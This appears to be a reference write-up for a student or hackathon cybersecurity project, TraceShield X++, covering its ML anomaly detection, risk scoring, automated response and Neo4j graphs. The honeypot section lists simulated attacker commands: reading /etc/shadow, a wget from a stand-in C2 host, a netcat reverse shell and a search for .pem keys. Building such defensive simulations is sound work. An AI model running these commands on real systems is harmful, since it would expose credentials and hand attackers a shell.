# TraceShield X++ — Full Technical Explanation

> This document explains every component, model, algorithm, layer, and design decision in the TraceShield X++ system. Use this as your reference when answering judge questions.

---

## 1. What is TraceShield X++?

TraceShield X++ is a **real-time cybersecurity forensics and anomaly detection platform**. It combines:

- Machine Learning (Isolation Forest + Local Outlier Factor)
- Rule-based threat detection
- Adaptive behavioral analysis (spike detection, trend detection, per-IP memory)
- Automated response (flagging, honeypot redirection, IP blocking)
- Graph-based attack visualization (Neo4j)
- A live React dashboard for SOC (Security Operations Center) monitoring

The system has **two independent backends**:

| Backend | Purpose | Port |
|---------|---------|------|
| `backend/` (TraceShield core) | Dashboard API — trains ML on intrusion dataset, serves risk scores to frontend | 8000 |
| `ingestion/` (Ingestion service) | Real-time event ingestion — processes live network events, triggers automated responses | 8001 |

---

## 2. Technology Stack

### Backend
| Technology | Version | Purpose |
|-----------|---------|---------|
| Python | 3.10+ | Core language |
| FastAPI | 0.116+ | REST API framework |
| Uvicorn | 0.35+ | ASGI server |
| scikit-learn | 1.7+ | ML models (Isolation Forest, LOF, StandardScaler) |
| pandas | 2.3+ | Data loading and manipulation |
| numpy | 2.2+ | Numerical operations |
| neo4j (driver) | 6.1+ | Graph database client |
| python-dotenv | 1.1+ | Environment variable management |
| pydantic | 2.11+ | Request/response validation |

### Frontend
| Technology | Version | Purpose |
|-----------|---------|---------|
| React | 18.2 | UI framework |
| Vite | 5.0 | Build tool and dev server |
| Tailwind CSS | 3.4 | Utility-first styling |
| Axios | 1.6 | HTTP client for API calls |

### Database
| Technology | Purpose |
|-----------|---------|
| Neo4j Desktop 2026 | Graph database for attack visualization |
| In-memory Python dicts | Per-IP behavioral history, blocked IPs, honeypot state |

---

## 3. System Architecture — Layers

```
┌─────────────────────────────────────────────────────────┐
│                    FRONTEND (React)                      │
│  RiskCard | AlertFeed | GraphPanel | HomePage            │
│  Calls: /api/analyze, /api/simulate, /api/graph          │
└────────────────────┬────────────────────────────────────┘
                     │ HTTP (Axios)
┌────────────────────▼────────────────────────────────────┐
│              CORE BACKEND (FastAPI :8000)                │
│                                                          │
│  ┌─────────────┐  ┌──────────────┐  ┌───────────────┐  │
│  │  ml_model   │  │  detection   │  │     risk      │  │
│  │ (IsoForest) │  │ (rule-based) │  │  (AFRS score) │  │
│  └─────────────┘  └──────────────┘  └───────────────┘  │
│  ┌─────────────┐  ┌──────────────┐  ┌───────────────┐  │
│  │ simulation  │  │graph_builder │  │  summarizer   │  │
│  │(synthetic)  │  │  (Neo4j)     │  │ (AI reports)  │  │
│  └─────────────┘  └──────────────┘  └───────────────┘  │
└────────────────────┬────────────────────────────────────┘
                     │
┌────────────────────▼────────────────────────────────────┐
│           INGESTION SERVICE (FastAPI :8001)              │
│                                                          │
│  ┌─────────────┐  ┌──────────────┐  ┌───────────────┐  │
│  │  ml_model   │  │  ip_memory   │  │  risk_engine  │  │
│  │(IsoForest+  │  │(per-IP hist) │  │(weighted score│  │
│  │  9 features)│  │              │  │  5 components)│  │
│  └─────────────┘  └──────────────┘  └───────────────┘  │
│  ┌─────────────┐  ┌──────────────┐                      │
│  │anomaly_det  │  │response_eng  │                      │
│  │(orchestrate)│  │(flag/block/  │                      │
│  │             │  │ honeypot)    │                      │
│  └─────────────┘  └──────────────┘                      │
└────────────────────┬────────────────────────────────────┘
                     │ Bolt protocol
┌────────────────────▼────────────────────────────────────┐
│                  NEO4J GRAPH DATABASE                    │
│  (:IP)-[:ATTACKED]->(:Device)                           │
│  (:IP)-[:REDIRECTED_TO]->(:Honeypot)                    │
│  (:IP)-[:BLOCKED]->(:System)                            │
└─────────────────────────────────────────────────────────┘
```

---

## 4. Machine Learning Models

### 4.1 Core Backend — Isolation Forest (ml_model.py)

**Algorithm:** Isolation Forest (unsupervised anomaly detection)

**How it works:**
- Builds an ensemble of random decision trees
- Anomalies are isolated in fewer splits (shorter path length)
- Normal points require more splits to isolate
- Returns a decision score: lower = more anomalous

**Training data:**
- If `backend/data/intrusion_data.csv` exists → uses real data
- Otherwise → generates 5000 synthetic logs via `simulation.py`
- Distribution: 80% normal, 20% attack patterns

**Features used (5):**
| Feature | Description |
|---------|-------------|
| `login_attempts` | Total login attempts |
| `failed_logins` | Number of failed logins |
| `session_duration` | Session length in seconds |
| `ip_reputation_score` | IP reputation (0=clean, 1=malicious) |
| `unusual_time_access` | 1 if access at odd hours |

**Hyperparameters:**
- `n_estimators = 200` — number of trees
- `contamination = 0.1` — expected 10% anomaly rate
- `random_state = 42` — reproducibility

**Output normalization:**
```
normalized_score = 1 - (raw_score - min) / (max - min + 1e-8)
```
Clamped to [0, 1] where 1 = most anomalous.

---

### 4.2 Ingestion Service — Isolation Forest + LOF Ensemble (services/ml_model.py)

**Algorithms:** Isolation Forest + Local Outlier Factor (ensemble)

**Features used (9):**
| Feature | Description |
|---------|-------------|
| `request_count` | Raw request volume |
| `log1p(request_count)` | Log-scaled volume (reduces skew) |
| `hour_of_day` | 0–23 temporal context |
| `is_night` | 1 if hour ≤ 6 or ≥ 22 |
| `is_weekend` | 1 if Saturday/Sunday |
| `requests_per_second` | Rate proxy (count/60) |
| `burst_flag` | 1 if count > 200 |
| `deviation_from_avg` | Spike ratio vs IP historical average |
| `historical_rate` | IP's historical requests-per-second |

**Training data (8000 synthetic samples):**
- 6400 normal: lognormal distribution (mean=3.5, σ=0.8), business hours, low deviation
- 1600 attack: lognormal distribution (mean=5.5, σ=1.0), off-hours, large deviation

**Hyperparameters:**
- Isolation Forest: `n_estimators=300`, `contamination=0.20`, `max_features=0.85`
- LOF: `n_neighbors=20`, `contamination=0.20`, `novelty=True`

**Score fusion:**
```
fused = 0.55 * iso_score + 0.45 * lof_score
```
Normalized to 0–100 where 100 = most anomalous.

**ML Anomaly Threshold:** score ≥ 60 = anomalous

---

## 5. Risk Scoring Systems

### 5.1 Core Backend — AFRS (Adaptive Forensic Risk Scoring)

**File:** `backend/core/risk.py`

**Formula:**
```
final_score = (ml_score × 40) + (rule_score × 12 per flag) + (ip_rep × 15) + (brute_force × 1.8)
```

**Components:**
| Component | Max | Description |
|-----------|-----|-------------|
| ML contribution | 40 | Isolation Forest anomaly score × 40 |
| Rule contribution | ~36 | Number of triggered rules × 12 |
| IP reputation | 15 | ip_reputation_score × 15 |
| Brute force | 9 | min(failed_logins, 5) × 1.8 |

**Classification:**
- ≥ 75 → CRITICAL
- ≥ 50 → HIGH
- ≥ 30 → MEDIUM
- < 30 → LOW

---

### 5.2 Ingestion Service — Weighted Adaptive Risk Engine

**File:** `ingestion/services/risk_engine.py`

**Formula:**
```
final = (0.35 × ml_score) + (0.25 × temporal_score) + (0.20 × count_score) + (0.10 × spike_score) + (0.10 × trend_score)
```

**5 Components:**

**1. ML Score (35% weight)**
- Output of the 9-feature Isolation Forest + LOF ensemble
- Normalized to 0–100
- Highest weight — behavioral anomaly is the primary signal

**2. Temporal Score (25% weight)**
- Computes requests-per-second (RPS) in a 60-second sliding window per IP
- Applies time-of-day multiplier:
  - Deep night (0–5): ×1.40
  - Late night (22–23): ×1.25
  - Early morning (6–8): ×1.10
  - Business hours: ×1.00
- Normalized to 0–100

**3. Count Score (20% weight)**
- Normalized request volume:
  - ≤ 5 → 0, ≤ 20 → 10, ≤ 50 → 25, ≤ 100 → 45, ≤ 300 → 70, ≤ 1000 → 88, > 1000 → 100

**4. Spike Score (10% weight)**
- Detects sudden increases vs IP historical average:
```
spike_ratio = (current_count - avg_count) / (avg_count + 1e-5)
spike_score = min(spike_ratio × 100, 100)
```
- Override: spike > 70 → floor final score at 40 (HIGH_RISK minimum)
- Override: spike ≥ 90 → floor final score at 60 (EXTREME_RISK minimum)

**5. Trend Score (10% weight)**
- Detects gradual escalation in request counts over time
- Two signals combined:
  - Monotonic rise ratio (40%): fraction of consecutive increases
  - Ramp-up ratio (60%): (latest - earliest) / (earliest + 1e-5) × 20
- Returns 0–100

**Classification (score-status consistency guaranteed):**
| Score Range | Status |
|-------------|--------|
| 0–25 | NORMAL |
| 25–40 | SUSPICIOUS |
| 40–60 | HIGH_RISK |
| 60–100 | EXTREME_RISK |

**Consistency guarantee:** Status is ALWAYS derived from score — never assigned independently. Overrides adjust the score first, then classification follows.

---

## 6. Rule-Based Detection Engine

**File:** `backend/core/detection.py`

4 rules evaluated on every log entry:

| Rule | Trigger Condition | Severity |
|------|------------------|----------|
| BRUTE_FORCE | failed_logins > 5 AND login_attempts > 10 | HIGH |
| LONG_SESSION | session_duration > 300 seconds | MEDIUM |
| LOW_REPUTATION_IP | ip_reputation_score < 0.3 | HIGH |
| ODD_ACCESS_TIME | unusual_time_access == 1 | MEDIUM |

Each rule returns: `{type, severity, message, readable_label}`

---

## 7. Per-IP Behavioral Memory

**File:** `ingestion/services/ip_memory.py`

- Maintains a sliding window of last 20 request counts and timestamps per IP
- Used for spike detection and trend analysis
- `avg_count()` — mean of historical counts (excluding current)
- `avg_rate()` — mean requests-per-second over history
- `trend_score()` — detects monotonic rise + ramp-up pattern
- Implemented as in-memory Python `defaultdict` — real-time safe, no I/O

---

## 8. Automated Response Engine

**File:** `ingestion/services/response_engine.py`

**4-tier response system:**

| Status | Score Range | Action |
|--------|-------------|--------|
| NORMAL | 0–25 | No action |
| SUSPICIOUS | 25–40 | Flag IP, increment flag counter |
| HIGH_RISK | 40–60 | Redirect to honeypot (simulated) |
| EXTREME_RISK | 60–100 | Block IP + redirect to honeypot |

**Honeypot simulation:**
- Assigns a unique honeypot ID (e.g., `honeypot_abcxyz`)
- Generates realistic fake attacker commands (non-repeating per IP):
  - `cat /etc/shadow`
  - `wget http://c2.example.com/payload.sh`
  - `nc -e /bin/bash 10.0.0.1 4444`
  - `find / -name '*.pem'`
  - etc.
- Tracks interaction count and fake data accessed

**Cooldown system:**
- Blocked IPs are automatically unblocked after 5 minutes (configurable)
- `BlockedEntry` stores timestamp and expiry
- `_cleanup_expired_blocks()` runs on every request

**State tracking (in-memory):**
- `_blocked` — dict of `{ip: BlockedEntry}`
- `_honeypot` — dict of `{ip: HoneypotEntry}`
- `_flagged` — dict of `{ip: {count, reason, timestamp}}`

---

## 9. Neo4j Graph Database Integration

### 9.1 Core Backend Graph (graph_builder.py)

Stores attack events from the dashboard analysis:
- `(:User)-[:EXECUTED]->(:Process)`
- `(:Process)-[:ACCESSED]->(:File)`
- `(:Process)-[:DELETED]->(:File)`

### 9.2 Ingestion Service Graph (db/neo4j.py)

Clean attack visualization graph with only 4 node types:

**Nodes:**
```cypher
(:IP     {address, status, risk_score, severity_level, last_seen})
(:Device {name})
(:Honeypot {id})
(:System {name: "TraceShield"})
```

**Relationships:**
```cypher
(:IP)-[:ATTACKED {timestamp, risk_score, status, reason, severity_level, ml_score, spike_score, trend_score, hit_count}]->(:Device)
(:IP)-[:REDIRECTED_TO {timestamp, reason, redirect_count}]->(:Honeypot)
(:IP)-[:BLOCKED {timestamp, reason, block_count}]->(:System)
```

**Key design decisions:**
- `MERGE` on relationships — prevents duplicates, increments `hit_count` on repeat
- `reason` field always populated (e.g., `"ml=68.6+spike=100.0+rate=100.0"`)
- `timestamp` always present — enables temporal queries
- IP node updated with latest `status`, `risk_score`, `severity_level` on every event
- `severity_level`: NORMAL=0, SUSPICIOUS=1, HIGH_RISK=2, EXTREME_RISK=3

**Query endpoints:**
| Endpoint | Description |
|----------|-------------|
| `GET /graph` | All attack relationships |
| `GET /graph/attacks` | Recent ATTACKED events with metadata |
| `GET /graph/ip/{ip}` | Full history for specific IP |
| `GET /graph/chain/{ip}` | Full attack chain path (IP→Device→Honeypot→System) |
| `GET /graph/summary` | Node and relationship counts |

---

## 10. Synthetic Data Generator

**File:** `backend/core/simulation.py`

Generates realistic network intrusion logs for ML training fallback:

**Distribution:**
- 70% NORMAL — low counts, business hours, clean IPs
- 20% SUSPICIOUS — moderate counts, mixed hours
- 10% ATTACK — high counts, off-hours, bad IPs, attack_detected=1

**Schema (9 fields):**
`network_packet_size, protocol_type, login_attempts, failed_logins, unusual_time_access, ip_reputation_score, session_duration, network_traffic_volume, attack_detected`

Uses `random.seed(42)` for reproducibility.

---

## 11. AI-Style Forensic Summarizer

**File:** `backend/core/summarizer.py`

Converts raw ML + rule output into human-readable analyst reports. No external APIs — fully local rule-driven generation.

**Output example:**
> "HIGH risk detected. Anomalous behavior detected by the ML model. Triggered rules: BRUTE_FORCE, LOW_REPUTATION_IP. Potential threat — monitor closely."

Also generates attack timelines:
- `BRUTE_FORCE` → "Multiple failed login attempts detected"
- `LOW_REPUTATION_IP` → "Connection from suspicious IP address"
- `ODD_ACCESS_TIME` → "Access during unusual hours"
- `LONG_SESSION` → "Unusually long session detected"

---

## 12. Frontend Dashboard

**Files:** `frontend/src/`

**Components:**

| Component | Purpose |
|-----------|---------|
| `App.jsx` | Main dashboard — state management, API calls, auto-refresh |
| `RiskCard.jsx` | Animated risk score with glow effects per risk level |
| `AlertFeed.jsx` | Flag badges, attack timeline, score breakdown bars |
| `GraphPanel.jsx` | Attack graph visualization with node type colors |
| `HomePage.jsx` | Landing page with cyberpunk aesthetic |

**Features:**
- Live auto-refresh toggle (every 5 seconds)
- Animated count-up for risk score
- Glow effects: 🔥 CRITICAL (red), ⚠️ HIGH (orange), ⚡ MEDIUM (yellow), ✅ LOW (green)
- Pulsing status indicators for Neo4j and Model
- Simulated graph fallback when Neo4j is offline

---

## 13. API Endpoints Reference

### Core Backend (:8000)
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/` | Health check |
| GET | `/api/analyze` | Analyze random sample from dataset |
| POST | `/api/simulate` | Simulate N attack logs |
| GET | `/api/graph` | Fetch attack graph |
| DELETE | `/api/graph/clear` | Clear graph |
| GET | `/api/status` | System status |
| GET | `/api/health` | Health check with Neo4j status |

### Ingestion Service (:8001)
| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/ingest` | Ingest real-time event |
| GET | `/health` | Health check |
| GET | `/blocked` | Blocked/flagged/honeypot state |
| GET | `/graph` | All attack relationships |
| GET | `/graph/attacks` | Recent attacks |
| GET | `/graph/ip/{ip}` | IP history |
| GET | `/graph/chain/{ip}` | Full attack chain |
| GET | `/graph/summary` | Graph statistics |

---

## 14. Data Flow — End to End

```
Network Event Arrives
        │
        ▼
POST /ingest {ip, device, request_count, timestamp}
        │
        ▼
┌─── ip_memory.py ───────────────────────────────┐
│  Record event in per-IP sliding window          │
│  Compute: avg_count, avg_rate, trend_score      │
└────────────────────────────────────────────────┘
        │
        ▼
┌─── ml_model.py ────────────────────────────────┐
│  Extract 9 features                             │
│  StandardScaler.transform()                     │
│  IsolationForest.decision_function()            │
│  LOF.decision_function()                        │
│  Fuse: 0.55×iso + 0.45×lof → ml_score (0-100) │
└────────────────────────────────────────────────┘
        │
        ▼
┌─── risk_engine.py ─────────────────────────────┐
│  count_score  = f(request_count)                │
│  temporal_score = RPS × time_of_day_multiplier  │
│  spike_score  = (count - avg) / (avg + 1e-5)   │
│  trend_score  = monotonic_rise + ramp_up        │
│                                                  │
│  final = 0.35×ml + 0.25×temporal +             │
│          0.20×count + 0.10×spike + 0.10×trend  │
│                                                  │
│  Apply overrides (spike/ML floor)               │
│  Classify: NORMAL/SUSPICIOUS/HIGH_RISK/EXTREME  │
└────────────────────────────────────────────────┘
        │
        ▼
┌─── response_engine.py ─────────────────────────┐
│  NORMAL       → no action                       │
│  SUSPICIOUS   → flag IP                         │
│  HIGH_RISK    → redirect to honeypot            │
│  EXTREME_RISK → block IP + honeypot             │
└────────────────────────────────────────────────┘
        │
        ▼
┌─── db/neo4j.py ────────────────────────────────┐
│  MERGE (:IP) SET status, risk_score             │
│  MERGE (:Device) / (:Honeypot) / (:System)      │
│  MERGE [:ATTACKED] / [:REDIRECTED_TO] /         │
│        [:BLOCKED]                               │
│  ON MATCH: update timestamp, increment hit_count│
└────────────────────────────────────────────────┘
        │
        ▼
Return JSON response with:
  status, risk_score, components, response, message
```

---

## 15. Key Design Decisions & Why

| Decision | Reason |
|----------|--------|
| Isolation Forest for anomaly detection | Unsupervised — no labelled data needed; works well on high-dimensional network data |
| LOF ensemble with Isolation Forest | LOF catches local density anomalies that Isolation Forest misses |
| 9 features including deviation and historical rate | Behavioral context improves detection of sophisticated slow attacks |
| Weighted scoring (not simple threshold) | More nuanced — combines multiple signals, harder to evade |
| Per-IP memory (sliding window) | Enables spike and trend detection — catches attacks that ramp up gradually |
| MERGE in Neo4j (not CREATE) | Prevents graph bloat from duplicate events; `hit_count` tracks frequency |
| Cooldown-based unblocking | Prevents permanent false-positive blocks; realistic defense behavior |
| Simulated honeypot | Safe demonstration of deception-based defense without real network changes |
| Score-status consistency validation | Eliminates logical contradictions (e.g., score=66 but status=EXTREME_RISK) |
| FastAPI with lifespan | Model trained once at startup, reused across all requests — no per-request overhead |

---

## 16. Security Considerations

- `.env` file excluded from git via `.gitignore`
- Neo4j credentials loaded from environment variables only
- No real network blocking — all responses are simulated
- CORS configured to allow only `localhost:5173` and `localhost:3000`
- Input validation via Pydantic models on all endpoints
- All Neo4j queries use parameterized statements — no injection risk

---

## 17. Extensibility

The system is designed to be extended:

| Extension Point | How to Add |
|----------------|-----------|
| New ML model | Replace `get_ml_score()` in `services/ml_model.py` |
| New detection rule | Add `if` block in `backend/core/detection.py` |
| Real IP blocking | Replace simulation in `response_engine._block_ip()` with firewall API call |
| Real honeypot | Replace `_redirect_honeypot()` with actual honeypot system integration |
| New graph relationship | Add function in `db/neo4j.py` following existing pattern |
| Streaming ingestion | Replace `/ingest` POST with WebSocket or Kafka consumer |
| Real dataset | Drop CSV at `backend/data/intrusion_data.csv` — system auto-detects |
